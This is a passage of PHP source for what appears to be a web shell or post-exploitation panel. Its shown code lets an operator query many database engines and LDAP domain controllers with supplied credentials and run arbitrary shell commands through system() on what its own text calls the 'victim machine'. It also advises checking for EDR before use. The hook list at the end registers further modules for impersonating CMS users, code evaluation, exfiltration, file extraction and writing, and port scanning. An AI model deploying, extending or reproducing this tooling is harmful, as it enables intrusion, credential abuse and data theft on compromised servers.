            echo "[Driver: PDO] PDO extension is loaded but PDO MySQL driver is not installed.\n";
        }
        else {
            echo "[Driver: none] MySQL extension is not loaded.\n";
        }
    }
    elseif ($db_type === 'cubrid') {
        $port = $port ?: 30000;

        // Check if the CUBRID PDO extension is loaded
        if (extension_loaded("pdo_cubrid")) {
            try {
                $dsn = "cubrid:host=$host;port=$port" .
                       (!empty($database) ? ";dbname=$database" : "") .
                       (!empty($charset) ? ";charset=$charset" : "");

                $pdo = new PDO($dsn, $username, $password);
                echo "[Driver: pdo_cubrid] Connected successfully using " .
                     htmlentities($username) .
                     ":" .
                     htmlentities($password) .
                     PHP_EOL;;

                if (!empty($query)) {
                    NrunPDOQuery($pdo, $query);
                }
            }
            catch (PDOException $e) {
                echo "[Driver: pdo_cubrid] Connection failed: " . htmlentities($e->getMessage());
            }
        }
        // Check if the CUBRID extension is loaded
        elseif (extension_loaded("cubrid")) {
            $connection = cubrid_connect($host, $port, $database, $username, $password);

            if (!$connection) {
                echo "[Driver: cubrid] Connection failed: " . htmlentities(cubrid_error_msg());
            }
            else {
                echo "[Driver: cubrid] Connected successfully using " .
                     htmlentities($username) .
                     ":" .
                     htmlentities($password) .
                     PHP_EOL;;

                if (!empty($query)) {
                    $result = cubrid_query($query, $connection);
                    if ($result) {
                        echo "[Driver: cubrid] Query executed successfully.\n";
                        $rows = array();
                        while ($row = cubrid_fetch_assoc($result)) {
                            $rows[] = $row;
                        }
                        NprintAsciiTable($rows);
                    }
                    else {
                        echo "[Driver: cubrid] Query failed: " . htmlentities(cubrid_error($connection));
                    }
                }
            }
        }
        else {
            echo "[Driver: none] CUBRID extension is not loaded.\n";
        }
    }
    elseif ($db_type === 'pgsql') {
        $port = $port ?: 5432;

        // Check if the PostgreSQL PDO extension is loaded
        if (extension_loaded("pdo_pgsql")) {
            try {
                $dsn = "pgsql:host=$host;port=$port" . (!empty($database) ? ";dbname=$database" : "");

                $pdo = new PDO($dsn, $username, $password);
                echo "[Driver: pdo_pgsql] Connected successfully using " .
                     htmlentities($username) .
                     ":" .
                     htmlentities($password) .
                     PHP_EOL;;

                if (!empty($query)) {
                    NrunPDOQuery($pdo, $query);
                }
            }
            catch (PDOException $e) {
                echo "[Driver: pdo_pgsql] Connection failed: " . htmlentities($e->getMessage());
            }
        }
        // Check if the PostgreSQL extension is loaded
        elseif (extension_loaded("pgsql")) {
            $connection = pg_connect("host=$host port=$port dbname=$database user=$username password=$password");

            if (!$connection) {
                echo "[Driver: pgsql] Connection failed: " . htmlentities(pg_last_error());
            }
            else {
                echo "[Driver: pgsql] Connected successfully using " .
                     htmlentities($username) .
                     ":" .
                     htmlentities($password) .
                     PHP_EOL;;

                if (!empty($query)) {
                    $result = pg_query($connection, $query);
                    if ($result) {
                        echo "[Driver: pgsql] Query executed successfully.\n";
                        $rows = array();
                        while ($row = pg_fetch_assoc($result)) {
                            $rows[] = $row;
                        }
                        NprintAsciiTable($rows);
                    }
                    else {
                        echo "[Driver: pgsql] Query failed: " . htmlentities(pg_last_error($connection));
                    }
                }
            }
        }
        else {
            echo "[Driver: none] PostgreSQL extension is not loaded.\n";
        }
    }
    elseif ($db_type === 'sqlite') {
        // Check if the SQLite PDO extension is loaded
        if (extension_loaded("pdo_sqlite")) {
            try {
                $dsn = "sqlite:$host";

                $pdo = new PDO($dsn);
                echo "[Driver: pdo_sqlite] Connected successfully using " . htmlentities($host) . PHP_EOL;

                if (!empty($query)) {
                    NrunPDOQuery($pdo, $query);
                }
            }
            catch (PDOException $e) {
                echo "[Driver: pdo_sqlite] Connection failed: " . htmlentities($e->getMessage());
            }
        }
        // Check if the SQLite extension is loaded
        elseif (extension_loaded("sqlite3")) {
            $connection = sqlite_open($host, 0666, $error);

            if (!$connection) {
                echo "[Driver: sqlite3] Connection failed: " . htmlentities($error);
            }
            else {
                echo "[Driver: sqlite3] Connected successfully using " . htmlentities($host) . PHP_EOL;

                if (!empty($query)) {
                    $result = sqlite_query($connection, $query);
                    if ($result) {
                        echo "[Driver: sqlite3] Query executed successfully.\n";
                        $rows = array();
                        while ($row = sqlite_fetch_array($result)) {
                            $rows[] = $row;
                        }
                        NprintAsciiTable($rows);
                    }
                    else {
                        echo "[Driver: sqlite3] Query failed: " .
                             htmlentities(sqlite_error_string(sqlite_last_error($connection)));
                    }
                }
            }
        }
        else {
            echo "[Driver: none] SQLite extension is not loaded.\n";
        }
    }
    elseif ($db_type === 'sqlsrv') {
        $port = $port ?: 1433;

        // Check if the SQL Server PDO extension is loaded
        if (extension_loaded("pdo_sqlsrv")) {
            try {
                $dsn = "sqlsrv:Server=$host,$port" . (!empty($database) ? ";Database=$database" : "");

                $pdo = new PDO($dsn, $username, $password);
                echo "[Driver: pdo_sqlsrv] Connected successfully using " .
                     htmlentities($username) .
                     ":" .
                     htmlentities($password) .
                     PHP_EOL;;

                if (!empty($query)) {
                    NrunPDOQuery($pdo, $query);
                }
            }
            catch (PDOException $e) {
                echo "[Driver: pdo_sqlsrv] Connection failed: " . htmlentities($e->getMessage());
            }
        }
        // Check if the SQL Server extension is loaded
        elseif (extension_loaded("sqlsrv")) {
            echo "Connecting to $host with default instance specification ...\n";
            $connection = sqlsrv_connect($host, array("Database" => $database, "UID" => $username, "PWD" => $password));

            if (!$connection) {
                echo "[Driver: sqlsrv] Connection failed: " . htmlentities(sqlsrv_errors());
                echo "[Driver: sqlsrv] Trying to connect to " .
                     htmlentities($host) .
                     "," .
                     htmlentities($port) .
                     "...\n";

                $connection = sqlsrv_connect(
                    "$host,$port",
                    array("Database" => $database, "UID" => $username, "PWD" => $password)
                );

                if (!$connection) {
                    echo "[Driver: sqlsrv] Connection failed: " . htmlentities(sqlsrv_errors());
                }
                else {
                    echo "[Driver: sqlsrv] Connected successfully using " .
                         htmlentities($username) .
                         ":" .
                         htmlentities($password) .
                         " (host,port).\n";
                }
            }
            else {
                echo "[Driver: sqlsrv] Connected successfully using " .
                     htmlentities($username) .
                     ":" .
                     htmlentities($password) .
                     " (host only).\n";
            }

            if (!empty($query) && $connection) {
                $result = sqlsrv_query($connection, $query);
                if ($result) {
                    echo "[Driver: sqlsrv] Query executed successfully.\n";
                    $rows = array();
                    while ($row = sqlsrv_fetch_array($result, SQLSRV_FETCH_ASSOC)) {
                        $rows[] = $row;
                    }
                    NprintAsciiTable($rows);
                }
                else {
                    echo "[Driver: sqlsrv] Query failed: " . htmlentities(sqlsrv_errors());
                }
            }
        }
        else {
            echo "[Driver: none] SQL Server extension is not loaded.\n";
        }
    }
    elseif ($db_type === 'oci') {
        $port = $port ?: 1521;

        // Check if the Oracle PDO extension is loaded
        if (extension_loaded("pdo_oci")) {
            try {
                if (!empty($sid)) {
                    $tns = "(DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = $host)(PORT = $port))(CONNECT_DATA = (SID = $sid)))";
                }
                else {
                    $tns = "(DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = $host)(PORT = $port))(CONNECT_DATA = (SERVICE_NAME = $service_name)))";
                }
                $dsn = "oci:dbname=$tns";

                $pdo = new PDO($dsn, $username, $password);
                echo "[Driver: pdo_oci] Connected successfully using " .
                     htmlentities($username) .
                     ":" .
                     htmlentities($password) .
                     PHP_EOL;;

                if (!empty($query)) {
                    NrunPDOQuery($pdo, $query);
                }
            }
            catch (PDOException $e) {
                echo "[Driver: pdo_oci] Connection failed: " . htmlentities($e->getMessage());
            }
        }
        // Check if the Oracle extension is loaded
        elseif (extension_loaded("oci8")) {
            $connection = oci_connect($username, $password, "$host:$port/$service_name");

            if (!$connection) {
                echo "[Driver: oci8] Connection failed: " . htmlentities(oci_error());
            }
            else {
                echo "[Driver: oci8] Connected successfully using " .
                     htmlentities($username) .
                     ":" .
                     htmlentities($password) .
                     PHP_EOL;;

                if (!empty($query)) {
                    $statement = oci_parse($connection, $query);
                    if ($statement) {
                        if (oci_execute($statement)) {
                            echo "[Driver: oci8] Query executed successfully.\n";
                            $rows = array();
                            while ($row = oci_fetch_assoc($statement)) {
                                $rows[] = $row;
                            }
                            NprintAsciiTable($rows);
                        }
                        else {
                            echo "[Driver: oci8] Query failed: " . htmlentities(oci_error($statement));
                        }
                    }
                    else {
                        echo "[Driver: oci8] Query failed: " . htmlentities(oci_error($connection));
                    }
                }
            }
        }
        else {
            echo "[Driver: none] Oracle extension is not loaded.\n";
        }
    }
    elseif ($db_type === 'mongodb') {
        $port = $port ?: 27017;
        $dsn  = "mongodb://$username:$password@$host:$port/$database";

        // Check if the MongoDB extension is loaded
        if (extension_loaded("mongodb")) {
            try {
                $connection = new MongoDB\Driver\Manager($dsn, explode("&", $options));
                echo "[Driver: mongodb] Connected successfully using " .
                     htmlentities($username) .
                     ":" .
                     htmlentities($password) .
                     PHP_EOL;;

                if (!empty($query)) {
                    $query  = new MongoDB\Driver\Query(array());
                    $cursor = $connection->executeQuery("$database.$collection", $query);

                    $rows = array();
                    foreach ($cursor as $row) {
                        $rows[] = $row;
                    }
                    NprintAsciiTable($rows);
                }
            }
            catch (MongoDB\Driver\Exception\Exception $e) {
                echo "[Driver: mongodb] Connection failed: " . htmlentities($e->getMessage());
            }
        }
        // Check if the Mongo extension is loaded
        elseif (extension_loaded("mongo")) {
            try {
                $connection = new Mongo($dsn, array_merge(array("connect" => true), explode("&", $options)));
                echo "[Driver: mongo] Connected successfully using " .
                     htmlentities($username) .
                     ":" .
                     htmlentities($password) .
                     PHP_EOL;;

                if (!empty($query)) {
                    $collection = $connection->selectCollection($database, $collection);
                    $cursor     = $collection->find();

                    $rows = array();
                    foreach ($cursor as $row) {
                        $rows[] = $row;
                    }
                    NprintAsciiTable($rows);
                }
            }
            catch (MongoConnectionException $e) {
                echo "[Driver: mongo] Connection failed: " . htmlentities($e->getMessage());
            }
            catch (Exception $e) {
                echo "[Driver: mongo] Connection failed: " . htmlentities($e->getMessage());
            }
        }
        else {
            echo "[Driver: none] MongoDB extension is not loaded.\n";
        }
    }
    elseif ($db_type === 'ibm') {
        $port = $port ?: 50000;
        $dsn  = "ibm:DRIVER={IBM DB2 ODBC DRIVER};DATABASE=$database;HOSTNAME=$host;PORT=$port;PROTOCOL=TCPIP;UID=$username;PWD=$password;";

        // Check if the IBM PDO extension is loaded
        if (extension_loaded("pdo_ibm")) {
            try {
                $pdo = new PDO($dsn);
                echo "[Driver: pdo_ibm] Connected successfully using $" .
                     htmlentities($username) .
                     ":" .
                     htmlentities($password) .
                     PHP_EOL;;

                if (!empty($query)) {
                    NrunPDOQuery($pdo, $query);
                }
            }
            catch (PDOException $e) {
                echo "[Driver: pdo_ibm] Connection failed: " . htmlentities($e->getMessage());
            }
        }
        // Check if the IBM extension is loaded
        elseif (extension_loaded("ibm")) {
            $connection = db2_connect($dsn, $username, $password);

            if (!$connection) {
                echo "[Driver: ibm] Connection failed: " . htmlentities(db2_conn_error());
            }
            else {
                echo "[Driver: ibm] Connected successfully using " .
                     htmlentities($username) .
                     ":" .
                     htmlentities($password) .
                     PHP_EOL;;

                if (!empty($query)) {
                    $result = db2_exec($connection, $query);
                    if ($result) {
                        echo "[Driver: ibm] Query executed successfully.\n";
                        $rows = array();
                        while ($row = db2_fetch_assoc($result)) {
                            $rows[] = $row;
                        }
                        NprintAsciiTable($rows);
                    }
                    else {
                        echo "[Driver: ibm] Query failed: " . htmlentities(db2_conn_error());
                    }
                }
            }
        }
        else {
            echo "[Driver: none] IBM extension is not loaded.\n";
        }
    }
    elseif ($db_type === 'firebird') {
        $port = $port ?: 3050;
        $dsn  = "firebird:dbname=$host/$port:$database" .
                (!empty($charset) ? ";charset=$charset" : "") .
                (!empty($role) ? ";role=$role" : "") .
                (!empty($dialect) ? ";dialect=$dialect" : "");

        // Check if the Firebird PDO extension is loaded
        if (extension_loaded("pdo_firebird")) {
            try {
                $pdo = new PDO($dsn, $username, $password);
                echo "[Driver: pdo_firebird] Connected successfully using " .
                     htmlentities($username) .
                     ":" .
                     htmlentities($password) .
                     PHP_EOL;;

                if (!empty($query)) {
                    NrunPDOQuery($pdo, $query);
                }
            }
            catch (PDOException $e) {
                echo "[Driver: pdo_firebird] Connection failed: " . htmlentities($e->getMessage());
            }
        }
        // Check if the Firebird extension is loaded
        elseif (extension_loaded("interbase")) {
            echo "Connecting to $host/$port:$database (TCP/IP on custom port) ...\n";
            $connection = ibase_connect($host . "/" . $port . ":" . $database, $username, $password);

            if (!$connection) {
                echo "[Driver: interbase] Connection failed: " . htmlentities(ibase_errmsg());
                echo "[Driver: interbase] Trying to connect to " .
                     htmlentities($host) .
                     ":" .
                     htmlentities($database) .
                     " (TCP/IP implicit port) ...\n";

                $connection = ibase_connect($host . ":" . $database, $username, $password);

                if (!$connection) {
                    echo "[Driver: interbase] Connection failed: " . htmlentities(ibase_errmsg());
                    echo "[Driver: interbase] Trying to connect to //" .
                         htmlentities($host) .
                         "/" .
                         htmlentities($database) .
                         " (NetBEUI) ...\n";

                    $connection = ibase_connect("//" . $host . "/" . $database, $username, $password);

                    if (!$connection) {
                        echo "[Driver: interbase] Connection failed: " . htmlentities(ibase_errmsg());
                    }
                    else {
                        echo "[Driver: interbase] Connected successfully using " .
                             htmlentities($username) .
                             ":" .
                             htmlentities($password) .
                             " (//host/database aka NetBEUI).\n";
                    }
                }
                else {
                    echo "[Driver: interbase] Connected successfully using " .
                         htmlentities($username) .
                         ":" .
                         htmlentities($password) .
                         " (host:database).\n";
                }
            }
            else {
                echo "[Driver: interbase] Connected successfully using " .
                     htmlentities($username) .
                     ":" .
                     htmlentities($password) .
                     " (host/port:database).\n";
            }

            if (!empty($query) && $connection) {
                $result = ibase_query($connection, $query);
                if ($result) {
                    echo "[Driver: interbase] Query executed successfully.\n";
                    $rows = array();
                    while ($row = ibase_fetch_assoc($result)) {
                        $rows[] = $row;
                    }
                    NprintAsciiTable($rows);
                }
                else {
                    echo "[Driver: interbase] Query failed: " . htmlentities(ibase_errmsg());
                }
            }
        }
        else {
            echo "[Driver: none] Firebird extension is not loaded.\n";
        }
    }
    elseif ($db_type === 'odbc') {
        $dsn = "odbc:Driver=$odbc_driver;Server=$host,$port;Database=$database;Uid=$username;Pwd=$password;";

        // Check if the ODBC PDO extension is loaded
        if (extension_loaded("pdo_odbc")) {
            try {
                $pdo = new PDO($dsn);
                echo "[Driver: pdo_odbc] Connected successfully using " .
                     htmlentities($username) .
                     ":" .
                     htmlentities($password) .
                     PHP_EOL;;

                if (!empty($query)) {
                    NrunPDOQuery($pdo, $query);
                }
            }
            catch (PDOException $e) {
                echo "[Driver: pdo_odbc] Connection failed: " . htmlentities($e->getMessage());
            }
        }
        // Check if the ODBC extension is loaded
        elseif (extension_loaded("odbc")) {
            $connection = odbc_connect($dsn, $username, $password);

            if (!$connection) {
                echo "[Driver: odbc] Connection failed: " . htmlentities(odbc_errormsg());
            }
            else {
                echo "[Driver: odbc] Connected successfully using " .
                     htmlentities($username) .
                     ":" .
                     htmlentities($password) .
                     PHP_EOL;;

                if (!empty($query)) {
                    $result = odbc_exec($connection, $query);
                    if ($result) {
                        echo "[Driver: odbc] Query executed successfully.\n";
                        $rows = array();
                        while ($row = odbc_fetch_array($result)) {
                            $rows[] = $row;
                        }
                        NprintAsciiTable($rows);
                    }
                    else {
                        echo "[Driver: odbc] Query failed: " . htmlentities(odbc_errormsg());
                    }
                }
            }
        }
        else {
            echo "[Driver: none] ODBC extension is not loaded.\n";
        }
    }
    elseif ($db_type === 'informix') {
        $port = $port ?: 9800;
        $dsn  = "informix:host=$host;service=$port;database=$database;server=$server;protocol=$protocol;EnableScrollableCursors=$enableScrollableCursors";

        // Check if the Informix PDO extension is loaded
        if (extension_loaded("pdo_informix")) {
            try {
                $pdo = new PDO($dsn, $username, $password);
                echo "[Driver: pdo_informix] Connected successfully using " .
                     htmlentities($username) .
                     ":" .
                     htmlentities($password) .
                     PHP_EOL;;

                if (!empty($query)) {
                    NrunPDOQuery($pdo, $query);
                }
            }
            catch (PDOException $e) {
                echo "[Driver: pdo_informix] Connection failed: " . htmlentities($e->getMessage());
            }
        }
        else {
            echo "[Driver: none] Informix extension is not loaded.\n";
        }
    }
    elseif ($db_type === 'sybase') {
        $port = $port ?: 5000;
        $dsn  = "sybase:host=$host:$port" . (!empty($database) ? ";dbname=$database" : "");

        // Check if the Sybase PDO extension is loaded
        if (extension_loaded("pdo_dblib")) {
            try {
                $pdo = new PDO($dsn, $username, $password);
                echo "[Driver: pdo_dblib] Connected successfully using " .
                     htmlentities($username) .
                     ":" .
                     htmlentities($password) .
                     PHP_EOL;;

                if (!empty($query)) {
                    NrunPDOQuery($pdo, $query);
                }
            }
            catch (PDOException $e) {
                echo "[Driver: pdo_dblib] Connection failed: " . htmlentities($e->getMessage());
            }
        }
        // Check if the Sybase extension is loaded
        elseif (extension_loaded("sybase")) {
            $connection = sybase_connect($host, $username, $password);

            if (!$connection) {
                echo "[Driver: sybase] Connection failed: " . htmlentities(sybase_get_last_message());
            }
            else {
                echo "[Driver: sybase] Connected successfully using " .
                     htmlentities($username) .
                     ":" .
                     htmlentities($password) .
                     PHP_EOL;;

                if (!empty($query)) {
                    $result = sybase_query($query, $connection);
                    if ($result) {
                        echo "[Driver: sybase] Query executed successfully.\n";
                        $rows = array();
                        while ($row = sybase_fetch_assoc($result)) {
                            $rows[] = $row;
                        }
                        NprintAsciiTable($rows);
                    }
                    else {
                        echo "[Driver: sybase] Query failed: " . htmlentities(sybase_get_last_message());
                    }
                }
            }
        }
        // Check if the FreeTDS extension is loaded
        elseif (extension_loaded("mssql")) {
            $connection = mssql_connect($host, $username, $password);

            if (!$connection) {
                echo "[Driver: mssql] Connection failed: " . htmlentities(mssql_get_last_message());
            }
            else {
                echo "[Driver: mssql] Connected successfully using " .
                     htmlentities($username) .
                     ":" .
                     htmlentities($password) .
                     PHP_EOL;;

                if (!empty($query)) {
                    $result = mssql_query($query, $connection);
                    if ($result) {
                        echo "Query executed successfully.\n";
                        while ($row = mssql_fetch_assoc($result)) {
                            echo json_encode($row);
                        }
                    }
                    else {
                        echo "Query failed: " . htmlentities(mssql_get_last_message());
                    }
                }
            }
        }
        else {
            echo "[Driver: none] Sybase extension is not loaded.\n";
        }
    }
    elseif ($db_type === 'raw') {
        $dsn = $raw_connection_string;

        // Check if the PDO extension is loaded
        if (extension_loaded("pdo")) {
            try {
                $pdo = new PDO($dsn, $username, $password);
                echo "[Driver: PDO] Connected successfully using " .
                     htmlentities($username) .
                     ":" .
                     htmlentities($password) .
                     PHP_EOL;;

                if (!empty($query)) {
                    NrunPDOQuery($pdo, $query);
                }
            }
            catch (PDOException $e) {
                echo "[Driver: PDO] Connection failed: " . htmlentities($e->getMessage());
            }
        }
        else {
            echo "[Driver: PDO] PDO extension is not loaded.\n";
        }
    }
    else {
        echo "[Driver: none] Unsupported database type: " . htmlentities($db_type) . PHP_EOL;
    }
}

/**
 * Hook the features to add the login feature
 *
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function NqueryDatabaseHooksFeatures(&$features) {
    global $QUERY_DATABASES;

    $features[] = array(
        "title"       => "Query databases",
        "description" => "Query databases using the provided credentials.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M20.25 6.375c0 2.278-3.694 4.125-8.25 4.125S3.75 8.653 3.75 6.375m16.5 0c0-2.278-3.694-4.125-8.25-4.125S3.75 4.097 3.75 6.375m16.5 0v11.25c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125V6.375m16.5 0v3.75m-16.5-3.75v3.75m16.5 0v3.75C20.25 16.153 16.556 18 12 18s-8.25-1.847-8.25-4.125v-3.75m16.5 0c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125" />
</svg>',
        "op"          => $QUERY_DATABASES,
    );
}


/**
 * Create the example page
 *
 * @param $page_content string The page content container
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $page string The current page
 * @param $css string The CSS of the page
 */
function NmakeQueryLDAPPage(&$page_content, $features, $page, $css) {
    $feature = array_values(
        array_filter(
            $features,
            function ($feature) use ($page) {
                return $feature["op"] === $page;
            }
        )
    );

    $page_content = NmakePage(
        $features,
        $css,
        $page,
        array(
            NmakePageHeader(
                $feature[0]["title"],
                $feature[0]["description"]
            ),
            NmakeForm(
                $page,
                $_SERVER["REQUEST_URI"],
                array(
                    NmakeInput(
                        "text",
                        "Domain controller",
                        "c69",
                        "hostname or IP address",
                        "The domain controller to connect to.",
                        true
                    ),
                    NmakeInput(
                        "text",
                        "LDAP port",
                        "x45",
                        "389",
                        "The port to connect to."
                    ),
                    NmakeInput(
                        "text",
                        "Domain",
                        "O29",
                        "example.com",
                        "The domain to connect to.",
                        true
                    ),
                    NmakeInput(
                        "text",
                        "Username",
                        "t14",
                        "admin",
                        "The username to connect with."
                    ),
                    NmakeInput(
                        "password",
                        "Password",
                        "q39",
                        "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
                        "The password to connect with."
                    ),
                    NmakeInput(
                        "textarea",
                        "Query",
                        "C67",
                        "(&(objectClass=user)(sAMAccountName=*))",
                        "The LDAP query to run against the domain controller.",
                        true
                    ),
                )
            ),
        )
    );
}

/**
 * Handle the login operation
 *
 * @param $operation string The operation to handle
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *
 * @return void
 */
function NhandleQueryLDAP($operation, $features) {
    NrunLDAPQuery(
        $_POST["c69"],
        !empty($_POST["x45"]) ? intval($_POST["x45"]) : null,
        !empty($_POST["t14"]) ? $_POST["t14"] : null,
        !empty($_POST["q39"]) ? $_POST["q39"] : null,
        $_POST["O29"],
        $_POST["C67"]
    );
}

/**
 * @param $server string LDAP server
 * @param $port int|null LDAP port
 * @param $username string|null LDAP username
 * @param $password string|null LDAP password
 * @param $domain string LDAP domain
 * @param $query string LDAP query
 *
 * @return void
 */
function NrunLDAPQuery($server, $port, $username, $password, $domain, $query) {
    $port = $port ?: 389;

    // Connect to LDAP server
    $ldap_conn = ldap_connect("ldap://$server", $port);

    if (!$ldap_conn) {
        echo "Connection failed: " . htmlentities(ldap_error($ldap_conn));
        return;
    }

    $base_dn = "DC=" . implode(",DC=", explode(".", $domain));
    echo "Connected successfully to LDAP server " . htmlentities($server) . ":" . htmlentities($port) . PHP_EOL;
    echo "Base DN: " . htmlentities($base_dn) . PHP_EOL;

    // Set LDAP options
    ldap_set_option($ldap_conn, LDAP_OPT_PROTOCOL_VERSION, 3);
    ldap_set_option($ldap_conn, LDAP_OPT_REFERRALS, 1);
    ldap_set_option($ldap_conn, LDAP_DEREF_ALWAYS, 1);

    // Bind to LDAP server
    if (!empty($username) && !empty($password)) {
        $username = "CN=$username,$base_dn";
        echo "Binding with username: " . htmlentities($username) . PHP_EOL;

        // Bind with username and password (authenticating)
        $ldap_bind = ldap_bind($ldap_conn, $username, $password);
    }
    else {
        echo "Binding anonymously\n";
        $ldap_bind = ldap_bind($ldap_conn);
    }

    if (!$ldap_bind) {
        echo "Bind failed: " . htmlentities(ldap_error($ldap_conn));
        return;
    }

    // Perform LDAP search
    $ldap_search = ldap_search($ldap_conn, $base_dn, trim($query), array("*"), 0, 0);

    if (!$ldap_search) {
        echo "Search failed: " . htmlentities(ldap_error($ldap_conn));
        return;
    }

    // Get search result entries
    $ldap_entries = ldap_get_entries($ldap_conn, $ldap_search);

    if (!$ldap_entries) {
        echo "Search failed: " . htmlentities(ldap_error($ldap_conn));
        return;
    }

    echo "Query executed successfully (Query: " . htmlentities($query) . ")\n";
    echo json_encode($ldap_entries);

    // Close LDAP connection
    ldap_unbind($ldap_conn);
}

/**
 * Hook the features to add the login feature
 *
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function NqueryLdapHooksFeatures(&$features) {
    global $QUERY_LDAP;

    $features[] = array(
        "title"       => "Query LDAP",
        "description" => "Query LDAP using the provided credentials.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 21h16.5M4.5 3h15M5.25 3v18m13.5-18v18M9 6.75h1.5m-1.5 3h1.5m-1.5 3h1.5m3-6H15m-1.5 3H15m-1.5 3H15M9 21v-3.375c0-.621.504-1.125 1.125-1.125h3.75c.621 0 1.125.504 1.125 1.125V21" />
</svg>',
        "op"          => $QUERY_LDAP,
    );
}


/**
 * Create the example page
 *
 * @param $page_content string The page content container
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $page string The current page
 * @param $css string The CSS of the page
 */
function NmakeSystemCommandPage(&$page_content, $features, $page, $css) {
    $feature = array_values(
        array_filter(
            $features,
            function ($feature) use ($page) {
                return $feature["op"] === $page;
            }
        )
    );

    $page_content = NmakePage(
        $features,
        $css,
        $page,
        array(
            NmakePageHeader(
                $feature[0]["title"],
                $feature[0]["description"]
            ),
            NmakeAlert(
                "Running system commands",
                "Running system commands results in the creation of a child process from the 
                webserver/php process (aka a new terminal is spawned), this behaviour as you may expect can be 
                easily detected by EDR and other security solutions.
                <br/>
                If triggering alert is not a problem, safely ignore this alert, otherwise carefully examine the 
                victim machine and ensure that there is no security solution running before using this module."
            ),
            NmakeForm(
                $page,
                $_SERVER["REQUEST_URI"],
                array(
                    NmakeInput(
                        "textarea",
                        "Command",
                        "c69",
                        "ls -lah | grep pass",
                        "Command to run through the default system shell. This can be used to establish a full duplex tunnel between the attacker and the victim machine.",
                        true
                    ),
                )
            ),
        )
    );
}

/**
 * Handle the login operation
 *
 * @param $operation string The operation to handle
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *
 * @return void
 */
function NhandleSystemCommand($operation, $features) {
    system($_POST["c69"]);
}

/**
 * Hook the features to add the login feature
 *
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function NsystemCommandHooksFeatures(&$features) {
    global $RUN_COMMAND;

    $features[] = array(
        "title"       => "Run command",
        "description" => "Run a system command using the default shell.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="m6.75 7.5 3 2.25-3 2.25m4.5 0h3m-9 8.25h13.5A2.25 2.25 0 0 0 21 18V6a2.25 2.25 0 0 0-2.25-2.25H5.25A2.25 2.25 0 0 0 3 6v12a2.25 2.25 0 0 0 2.25 2.25Z" />
</svg>',
        "op"          => $RUN_COMMAND,
    );
}


add_hook("isolated_ops", "NdrupalImpersonateHooksIsolatedOps");
add_hook("features", "NdrupalImpersonateHooksFeatures");
add_named_hook("GET_page", $IMPERSONATE_DRUPAL_USER, "NmakeDrupalImpersonatePage");
add_named_hook("POST_operation", $IMPERSONATE_DRUPAL_USER, "NhandleDrupalImpersonate");


add_hook("features", "NcheckDrupalRolesHooksFeatures");
add_named_hook("GET_page", $CHECK_DRUPAL_USER_ROLES, "NmakeCheckDrupalRolesPage");


add_hook("isolated_ops", "NjoomlaImpersonateHooksIsolatedOps");
add_hook("features", "NjoomlaImpersonateHooksFeatures");
add_named_hook("GET_page", $IMPERSONATE_JOOMLA_USER, "NmakeJoomlaImpersonatePage");
add_named_hook("POST_operation", $IMPERSONATE_JOOMLA_USER, "NhandleJoomlaImpersonate");


add_hook("isolated_ops", "NWpImpersonateHooksIsolatedOps");
add_hook("features", "NWpImpersonateHooksFeatures");
add_named_hook("GET_page", $IMPERSONATE_WP_USER, "NmakeWpImpersonatePage");
add_named_hook("POST_operation", $IMPERSONATE_WP_USER, "NhandleWpImpersonate");


add_hook("features", "NcodeEvalHooksFeatures");
add_named_hook("GET_page", $EVAL, "NmakeCodeEvaluationPage");
add_named_hook("POST_operation", $EVAL, "NhandleCodeEvaluation");


add_hook("features", "NdirectoryListingHooksFeatures");
add_named_hook("GET_page", $DIRECTORY_LISTING, "NmakeDirectoryListingPage");
add_named_hook("POST_operation", $DIRECTORY_LISTING, "NhandleDirectoryListing");


add_hook("isolated_ops", "NexfiltrateHooksIsolatedOps");
add_hook("features", "NexfiltrateHooksFeatures");
add_named_hook("GET_page", $EXFILTRATE, "NmakeExfiltratePage");
add_named_hook("POST_operation", $EXFILTRATE, "NhandleExfiltrate");


add_hook("isolated_ops", "NfileExtractionHooksIsolatedOps");
add_hook("features", "NfileExtractionHooksFeatures");
add_named_hook("GET_page", $FILE_EXTRACTION, "NmakeFileExtractionPage");
add_named_hook("GET_page", $FILE_EXTRACTION_PREVIEW, "NmakeFileExtractionPage");
add_named_hook("POST_operation", $FILE_EXTRACTION, "NhandleFileExtraction");
add_named_hook("POST_operation", $FILE_EXTRACTION_PREVIEW, "NhandleFileExtraction");


add_hook("features", "NfileWriteHooksFeatures");
add_named_hook("GET_page", $WRITE_FILE, "NmakeWriteFilePage");
add_named_hook("POST_operation", $WRITE_FILE, "NhandleWriteFile");


session_start();
add_hook("page_generation", "NloginHooksPageGeneration");
add_hook("isolated_ops", "NloginHooksIsolatedOps");
add_hook("features", "NloginHooksFeatures");
add_named_hook("GET_page", $LOGIN, "NmakeLoginPage");
add_named_hook("POST_operation", $LOGIN, "NhandleLogin");


add_hook("features", "NphpInfoHooksFeatures");
add_named_hook("GET_page", $PHP_INFO, "NmakePhpInfoPage");


add_hook("features", "NportScanHooksFeatures");
